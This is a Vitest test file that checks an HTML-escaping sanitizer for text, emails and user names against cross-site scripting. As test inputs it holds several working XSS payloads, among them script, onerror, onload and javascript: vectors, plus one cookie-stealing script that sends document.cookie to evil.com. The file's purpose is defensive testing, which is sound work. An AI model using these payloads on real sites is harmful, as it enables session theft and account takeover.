/**
 * Sanitization Tests
 *
 * Critical path tests for XSS prevention:
 * - HTML entity encoding
 * - Edge cases (empty strings, special characters)
 * - Email and name sanitization
 */

import { describe, it, expect } from 'vitest';
import { sanitizeText, sanitizeEmail, sanitizeUserName } from '@/lib/utils/sanitize';

describe('sanitizeText', () => {
  describe('XSS Prevention', () => {
    it('should escape < and > characters', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeText(input);

      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should escape double quotes', () => {
      const input = 'onclick="malicious()"';
      const result = sanitizeText(input);

      expect(result).toBe('onclick=&quot;malicious()&quot;');
      expect(result).not.toContain('"');
    });

    it('should escape single quotes', () => {
      const input = "onclick='malicious()'";
      const result = sanitizeText(input);

      expect(result).toBe('onclick=&#x27;malicious()&#x27;');
      expect(result).not.toContain("'");
    });

    it('should escape ampersand', () => {
      const input = 'param1=value1&param2=value2';
      const result = sanitizeText(input);

      expect(result).toBe('param1=value1&amp;param2=value2');
    });

    it('should handle complex XSS attack vectors', () => {
      const attacks = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        '<div style="background:url(javascript:alert(1))">',
        '"><script>alert(document.cookie)</script>',
        "'-alert(1)-'",
        '<iframe src="data:text/html,<script>alert(1)</script>">',
      ];

      for (const attack of attacks) {
        const result = sanitizeText(attack);
        expect(result).not.toContain('<');
        expect(result).not.toContain('>');
        // Result should contain escaped entities
        if (attack.includes('<')) {
          expect(result).toContain('&lt;');
        }
        if (attack.includes('>')) {
          expect(result).toContain('&gt;');
        }
      }
    });

    it('should handle event handler injection attempts', () => {
      const input = '" onfocus="alert(1)" autofocus="';
      const result = sanitizeText(input);

      expect(result).toBe('&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;');
    });

    it('should handle nested encoding attempts', () => {
      const input = '&lt;script&gt;'; // Already encoded
      const result = sanitizeText(input);

      // The & should be encoded, making it safe even if decoded multiple times
      expect(result).toBe('&amp;lt;script&amp;gt;');
    });
  });

  describe('Edge Cases', () => {
    it('should return empty string for empty input', () => {
      expect(sanitizeText('')).toBe('');
    });

    it('should return empty string for null-like values', () => {
      expect(sanitizeText(null as unknown as string)).toBe('');
      expect(sanitizeText(undefined as unknown as string)).toBe('');
    });

    it('should return empty string for non-string types', () => {
      expect(sanitizeText(123 as unknown as string)).toBe('');
      expect(sanitizeText({} as unknown as string)).toBe('');
      expect(sanitizeText([] as unknown as string)).toBe('');
    });

    it('should preserve normal text unchanged', () => {
      const input = 'Hello, this is a normal text message!';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should preserve numbers and special safe characters', () => {
      const input = 'Price: $99.99 - 50% off!';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should preserve whitespace', () => {
      const input = '  text with   spaces  ';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should preserve newlines and tabs', () => {
      const input = 'line1\nline2\ttabbed';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should handle unicode characters', () => {
      const input = 'Héllo Wörld! 中文 日本語 emoji: 🎉';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(100000);
      const result = sanitizeText(longString);
      expect(result).toBe(longString);
      expect(result.length).toBe(100000);
    });

    it('should handle mixed safe and unsafe characters', () => {
      const input = 'Hello <World> & "Friends"';
      const result = sanitizeText(input);
      expect(result).toBe('Hello &lt;World&gt; &amp; &quot;Friends&quot;');
    });
  });

  describe('Special Characters', () => {
    it('should not escape forward slashes', () => {
      const input = 'https://example.com/path';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should not escape backticks', () => {
      const input = 'const x = `template ${var}`;';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should not escape parentheses', () => {
      const input = 'function(arg1, arg2)';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should not escape equals sign', () => {
      const input = 'x = y + z';
      expect(sanitizeText(input)).toBe(input);
    });

    it('should handle HTML entities in input', () => {
      // If input already contains HTML entities, they should be double-encoded for safety
      const input = '&amp; &lt; &gt;';
      const result = sanitizeText(input);
      expect(result).toBe('&amp;amp; &amp;lt; &amp;gt;');
    });
  });
});

describe('sanitizeEmail', () => {
  it('should convert email to lowercase', () => {
    expect(sanitizeEmail('USER@EXAMPLE.COM')).toBe('user@example.com');
  });

  it('should trim whitespace', () => {
    expect(sanitizeEmail('  user@example.com  ')).toBe('user@example.com');
  });

  it('should escape XSS in email', () => {
    const maliciousEmail = 'user"><script>@example.com';
    const result = sanitizeEmail(maliciousEmail);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toContain('"');
  });

  it('should return empty string for non-string input', () => {
    expect(sanitizeEmail(null as unknown as string)).toBe('');
    expect(sanitizeEmail(undefined as unknown as string)).toBe('');
    expect(sanitizeEmail(123 as unknown as string)).toBe('');
  });

  it('should handle email with plus addressing', () => {
    const email = 'user+tag@example.com';
    expect(sanitizeEmail(email)).toBe('user+tag@example.com');
  });

  it('should handle email with dots in local part', () => {
    const email = 'first.last@example.com';
    expect(sanitizeEmail(email)).toBe('first.last@example.com');
  });

  it('should combine lowercase, trim, and escape', () => {
    const input = '  User<script>@EXAMPLE.COM  ';
    const result = sanitizeEmail(input);
    expect(result).toBe('user&lt;script&gt;@example.com');
  });
});

describe('sanitizeUserName', () => {
  it('should trim whitespace', () => {
    expect(sanitizeUserName('  John Doe  ')).toBe('John Doe');
  });

  it('should preserve case (unlike email)', () => {
    expect(sanitizeUserName('John DOE')).toBe('John DOE');
  });

  it('should escape XSS in name', () => {
    const maliciousName = 'John<script>alert(1)</script>Doe';
    const result = sanitizeUserName(maliciousName);
    expect(result).toBe('John&lt;script&gt;alert(1)&lt;/script&gt;Doe');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('should return empty string for non-string input', () => {
    expect(sanitizeUserName(null as unknown as string)).toBe('');
    expect(sanitizeUserName(undefined as unknown as string)).toBe('');
    expect(sanitizeUserName(123 as unknown as string)).toBe('');
  });

  it('should preserve unicode characters in names', () => {
    const unicodeNames = [
      'José García',
      'Müller',
      'François',
      'Björk',
      '中文名字',
      'Наташа',
      'مريم',
    ];

    for (const name of unicodeNames) {
      expect(sanitizeUserName(name)).toBe(name);
    }
  });

  it('should handle names with apostrophes (escaping them)', () => {
    const name = "O'Brien";
    const result = sanitizeUserName(name);
    expect(result).toBe('O&#x27;Brien');
  });

  it('should handle names with hyphens', () => {
    const name = 'Mary-Jane Watson';
    expect(sanitizeUserName(name)).toBe('Mary-Jane Watson');
  });

  it('should handle single character names', () => {
    expect(sanitizeUserName('A')).toBe('A');
  });

  it('should handle empty string after trim', () => {
    expect(sanitizeUserName('   ')).toBe('');
  });
});

describe('Security Guarantees', () => {
  it('should prevent stored XSS by escaping all user content', () => {
    const userInputs = [
      { type: 'text', value: '<script>document.location="http://evil.com?c="+document.cookie</script>' },
      { type: 'email', value: '"><script>alert(1)</script>"@test.com' },
      { type: 'name', value: '<img src=x onerror=alert(1)>' },
    ];

    for (const input of userInputs) {
      const sanitized = input.type === 'email'
        ? sanitizeEmail(input.value)
        : input.type === 'name'
        ? sanitizeUserName(input.value)
        : sanitizeText(input.value);

      // Critical: No raw HTML tags should exist (< and > must be escaped)
      // This prevents browser from parsing as HTML elements
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
      // Escaped entities should be present instead
      if (input.value.includes('<')) {
        expect(sanitized).toContain('&lt;');
      }
      if (input.value.includes('>')) {
        expect(sanitized).toContain('&gt;');
      }
    }
  });

  it('should be idempotent (double sanitization should be safe)', () => {
    const input = 'Hello <World>';
    const once = sanitizeText(input);
    const twice = sanitizeText(once);

    // Double sanitization results in double-encoded entities
    // This is expected and safe behavior
    expect(twice).toBe('Hello &amp;lt;World&amp;gt;');
  });
});
